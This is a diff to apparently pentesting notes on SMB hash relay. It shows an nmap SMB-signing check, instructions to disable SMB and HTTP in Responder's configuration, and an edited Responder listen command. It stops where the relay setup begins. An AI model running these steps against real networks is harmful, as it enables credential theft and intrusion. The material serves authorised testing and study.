@@ -11,7 +11,7 @@ nmap -script=smb2-security-mode.nse -p 445 TARGET-IP
 In order to relay the hashes, we'll need to edit the configuration file [responder.conf] with SMB to 'Off' and HTTP to 'Off'.<br>
 Then proceed with listening for events:
 ```bash
-sudo responder -I eth0 -dwPv
+sudo responder -I eth0 -dPv
 ```
 As well as, set up a relay:
 ```bash
